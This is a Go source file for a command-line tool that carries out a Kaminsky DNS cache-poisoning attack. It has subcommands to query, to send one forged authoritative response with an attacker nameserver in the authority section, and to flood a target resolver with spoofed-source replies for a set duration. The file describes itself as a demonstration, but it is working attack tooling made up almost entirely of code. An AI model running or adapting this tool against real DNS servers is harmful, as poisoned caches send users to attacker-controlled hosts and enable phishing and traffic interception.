package main

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/spf13/cobra"
	kaminsky "go-kaminsky"
)

type Config struct {
	// Common flags
	targetAddr   string
	spoofedAddrs []string
	hostname     string
	attackerNS   string

	// Query mode flags
	dnsServer string

	// Spoof mode flags
	spoofedResponse string

	// Attack mode flags
	targetDomain string
	duration     float32
}

var config Config

var rootCmd = &cobra.Command{
	Use:   "kaminsky-attack",
	Short: "A simple CLI to demonstrate the kaminsky attack",
}

var queryCmd = &cobra.Command{
	Use:   "query",
	Short: "Run a DNS query for an A record",
	RunE: func(cmd *cobra.Command, args []string) error {
		return query(config.hostname, config.dnsServer)
	},
}

var spoofCmd = &cobra.Command{
	Use:   "spoof",
	Short: "Spoof a DNS response for an A record with NS record in Authority section",
	RunE: func(cmd *cobra.Command, args []string) error {
		spoofedAddr := net.ParseIP(config.spoofedAddrs[0]).To4()
		targetAddr := net.ParseIP(config.targetAddr).To4()
		spoofedResponse := net.ParseIP(config.spoofedResponse).To4()

		if spoofedAddr == nil || targetAddr == nil || spoofedResponse == nil {
			return fmt.Errorf("invalid IP address provided")
		}

		return spoof(spoofedAddr, targetAddr, config.hostname, config.attackerNS, spoofedResponse)
	},
}

var attackCmd = &cobra.Command{
	Use:   "attack",
	Short: "Run a Kaminsky DNS cache poisoning attack",
	RunE: func(cmd *cobra.Command, args []string) error {
		targetAddr := net.ParseIP(config.targetAddr).To4()
		if targetAddr == nil {
			return fmt.Errorf("invalid target IP address")
		}

		var spoofedAddrs []net.IP
		for _, addr := range config.spoofedAddrs {
			ip := net.ParseIP(addr).To4()
			if ip == nil {
				return fmt.Errorf("invalid spoofed IP address: %s", addr)
			}
			spoofedAddrs = append(spoofedAddrs, ip)
		}

		duration := time.Duration(float64(config.duration) * float64(time.Second))
		return attack(config.attackerNS, config.targetDomain, targetAddr, duration, spoofedAddrs)
	},
}

func init() {
	// Add commands to root
	rootCmd.AddCommand(queryCmd, spoofCmd, attackCmd)

	// Common flags
	spoofCmd.Flags().StringVar(&config.targetAddr, "target-addr", "", "IP address to send spoofed replies to")
	spoofCmd.Flags().StringSliceVar(&config.spoofedAddrs, "spoofed-addrs", []string{}, "IP addresses to spoof responses from")
	spoofCmd.Flags().StringVar(&config.hostname, "hostname", "", "Hostname to query or spoof a response for")
	spoofCmd.Flags().StringVar(&config.attackerNS, "attacker-ns", "", "Nameserver to advertise as authoritative")

	// Query mode flags
	queryCmd.Flags().StringVar(&config.hostname, "hostname", "", "Hostname to query")
	queryCmd.Flags().StringVar(&config.dnsServer, "dns-server", "", "IP or hostname of DNS server to query")

	// Spoof mode flags
	spoofCmd.Flags().StringVar(&config.spoofedResponse, "spoofed-response", "", "IP address for the spoofed A record")

	// Attack mode flags
	attackCmd.Flags().StringVar(&config.targetAddr, "target-addr", "", "Target DNS server to poison")
	attackCmd.Flags().StringVar(&config.targetDomain, "target-domain", "", "Domain to target")
	attackCmd.Flags().Float32Var(&config.duration, "duration", 5.0, "Duration of attack in seconds")
	attackCmd.Flags().StringSliceVar(&config.spoofedAddrs, "spoofed-addrs", []string{}, "IP addresses to spoof from")
	attackCmd.Flags().StringVar(&config.attackerNS, "attacker-ns", "", "Attacker's nameserver")

	// Required flags
	queryCmd.MarkFlagRequired("hostname")
	queryCmd.MarkFlagRequired("dns-server")

	spoofCmd.MarkFlagRequired("target-addr")
	spoofCmd.MarkFlagRequired("spoofed-addrs")
	spoofCmd.MarkFlagRequired("hostname")
	spoofCmd.MarkFlagRequired("attacker-ns")
	spoofCmd.MarkFlagRequired("spoofed-response")

	attackCmd.MarkFlagRequired("target-addr")
	attackCmd.MarkFlagRequired("target-domain")
	attackCmd.MarkFlagRequired("attacker-ns")
	attackCmd.MarkFlagRequired("spoofed-addrs")
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
	}
}

func query(hostname, dnsServer string) error {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(hostname), dns.TypeA)

	c := new(dns.Client)
	r, _, err := c.Exchange(m, net.JoinHostPort(dnsServer, "53"))
	if err != nil {
		return fmt.Errorf("DNS query failed: %w", err)
	}

	if r.Rcode != dns.RcodeSuccess {
		return fmt.Errorf("DNS query returned non-success code: %v", r.Rcode)
	}

	// Print the results
	for _, ans := range r.Answer {
		fmt.Println(ans)
	}

	return nil
}

func spoof(spoofedAddr, targetAddr net.IP, hostname, attackerNS string, spoofedResponse net.IP) error {
	// Create a new message
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(hostname), dns.TypeA)
	m.Authoritative = true
	m.Response = true

	// Add the A record answer
	aRec := &dns.A{
		Hdr: dns.RR_Header{
			Name:   dns.Fqdn(hostname),
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		A: spoofedResponse,
	}
	m.Answer = append(m.Answer, aRec)

	// Add the NS record in authority section
	domain := extractDomain(hostname)
	nsRec := &dns.NS{
		Hdr: dns.RR_Header{
			Name:   dns.Fqdn(domain),
			Rrtype: dns.TypeNS,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		Ns: dns.Fqdn(attackerNS),
	}
	m.Ns = append(m.Ns, nsRec)

	// Create spoofer
	spoofer, err := kaminsky.NewSpoofer(spoofedAddr, targetAddr, m.Len())
	if err != nil {
		return fmt.Errorf("creating spoofer: %w", err)
	}
	defer spoofer.Close()

	packed, err := m.Pack()
	if err != nil {
		return fmt.Errorf("packing DNS message: %w", err)
	}

	// Send the spoofed packet
	if err := spoofer.SendBytes(packed); err != nil {
		return fmt.Errorf("sending spoofed packet: %w", err)
	}

	fmt.Println("Sent spoofed response")
	return nil
}

func attack(attackerNS string, targetDomain string, targetAddr net.IP, duration time.Duration, spoofedAddrs []net.IP) error {
	// Use the Attack function from the kaminsky package
	return kaminsky.Attack(
		attackerNS,
		targetDomain,
		targetAddr,
		spoofedAddrs,
		duration,
		10*time.Millisecond, // reasonable default delay
	)
}

func extractDomain(hostname string) string {
	parts := strings.Split(hostname, ".")
	if len(parts) <= 2 {
		return hostname
	}
	return strings.Join(parts[1:], ".")
}
